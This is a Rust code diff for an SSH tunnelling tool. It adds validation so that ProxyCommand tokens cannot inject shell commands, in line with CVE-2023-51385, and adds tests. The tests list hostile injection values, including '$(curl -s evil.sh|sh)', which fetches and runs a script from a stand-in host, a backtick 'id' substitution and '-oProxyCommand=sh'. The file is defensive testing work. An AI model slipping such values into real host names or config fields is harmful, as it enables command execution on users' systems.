@@ -1218,6 +1218,13 @@ fn expand_tokens(value: &str, host_name: &str, user: Option<&str>, home: &Path) 
 /// Expands the `ProxyCommand` tokens OpenSSH documents for it: `%h`, `%n`,
 /// `%p`, `%r` and `%%`. An unknown token is an error naming it, like OpenSSH,
 /// so a command is never run with a token silently left in place.
+///
+/// The command itself is shell code from the user's SSH config, but the
+/// values substituted into it are not: `%n` is the alias stored in a tunnel
+/// profile (which an imported bundle can set), and `%h` falls back to it when
+/// no `HostName` applies. A substituted value that the shell would interpret
+/// is an error, as in OpenSSH since CVE-2023-51385, so it can never inject
+/// commands or options into the `$SHELL -c` line.
 pub fn expand_proxy_command(
     raw: &str,
     host_name: &str,
@@ -1232,17 +1239,42 @@ pub fn expand_proxy_command(
             out.push(c);
             continue;
         }
-        match chars.next() {
-            Some('h') => out.push_str(host_name),
-            Some('n') => out.push_str(alias),
-            Some('p') => out.push_str(&port.to_string()),
-            Some('r') => out.push_str(user),
-            Some('%') => out.push('%'),
+        let (token, value) = match chars.next() {
+            Some('h') => ('h', host_name),
+            Some('n') => ('n', alias),
+            Some('r') => ('r', user),
+            Some('p') => {
+                out.push_str(&port.to_string());
+                continue;
+            }
+            Some('%') => {
+                out.push('%');
+                continue;
+            }
             Some(other) => return Err(format!("unknown ProxyCommand token %{other}")),
             None => return Err("ProxyCommand ends with a lone %".to_string()),
+        };
+        if !is_shell_safe_token_value(value) {
+            return Err(format!(
+                "the value for ProxyCommand token %{token} contains whitespace, a shell \
+                 metacharacter or a leading '-', so the command is not run"
+            ));
         }
+        out.push_str(value);
     }
     Ok(out)
+}
+
+/// Whether `value` passes through `$SHELL -c` literally: no leading `-`
+/// (an option to the proxy program) and only alphanumerics (Unicode
+/// included, for IDN host names) and `.-_:@%+`. Everything else is refused:
+/// whitespace, control characters, quotes, `$`, backticks, `\`,
+/// `;&|<>(){}`, globs, `!`, `#` and `~`.
+fn is_shell_safe_token_value(value: &str) -> bool {
+    !value.starts_with('-')
+        && value
+            .chars()
+            .all(|c| c.is_alphanumeric() || matches!(c, '.' | '-' | '_' | ':' | '@' | '%' | '+'))
 }
 
 /// Local user name for the `User` fallback and `%r`. `USER` first, then
@@ -2383,5 +2415,75 @@ mod tests {
 
         // Restore access so the temp directory can be cleaned up.
         fs::set_permissions(&conf_d, fs::Permissions::from_mode(0o755)).unwrap();
+    }
+
+    #[test]
+    fn proxy_command_ending_in_a_lone_percent_is_an_error() {
+        let error = expand_proxy_command("nc %h %p %", "h.example.com", 22, "deploy", "web")
+            .expect_err("a trailing % is not a token");
+
+        assert!(error.contains("lone %"), "got: {error}");
+    }
+
+    #[test]
+    fn proxy_command_accepts_host_names_users_and_aliases_ssh_accepts() {
+        let expanded = expand_proxy_command(
+            "connect %h %n %r",
+            "fe80::1%eth0",
+            22,
+            "first.last@corp.example",
+            "b\u{fc}cher.example",
+        )
+        .unwrap();
+
+        assert_eq!(
+            expanded,
+            "connect fe80::1%eth0 b\u{fc}cher.example first.last@corp.example"
+        );
+    }
+
+    /// The alias and the host name and user it resolves to are substituted
+    /// into a `$SHELL -c` line; a value the shell would interpret is refused
+    /// for every token that carries one (CVE-2023-51385).
+    #[test]
+    fn proxy_command_refuses_token_values_the_shell_would_interpret() {
+        let unsafe_values = [
+            "a;touch /tmp/x",
+            "$(curl -s evil.sh|sh).corp.example",
+            "`id`.corp.example",
+            "a b",
+            "a\nb",
+            "a'b",
+            "a\"b",
+            "a\\b",
+            "a|b",
+            "a&b",
+            "a>b",
+            "a*",
+            "a#b",
+            "~root",
+            "-oProxyCommand=sh",
+        ];
+        for value in unsafe_values {
+            for (token, raw) in [("%h", "nc %h 22"), ("%n", "nc %n 22"), ("%r", "nc -u %r h")] {
+                let error = expand_proxy_command(raw, value, 22, value, value)
+                    .expect_err("an unsafe value must not be substituted");
+                assert!(
+                    error.contains(token) && error.contains("shell metacharacter"),
+                    "{token} with {value:?}: {error}"
+                );
+                assert!(
+                    !error.contains(value),
+                    "{token}: the error echoes {value:?}"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn proxy_command_unsafe_values_matter_only_where_a_token_uses_them() {
+        let expanded = expand_proxy_command("nc %h %p", "bastion.example.com", 22, "a b", "a;b");
+
+        assert_eq!(expanded.as_deref(), Ok("nc bastion.example.com 22"));
     }
 }
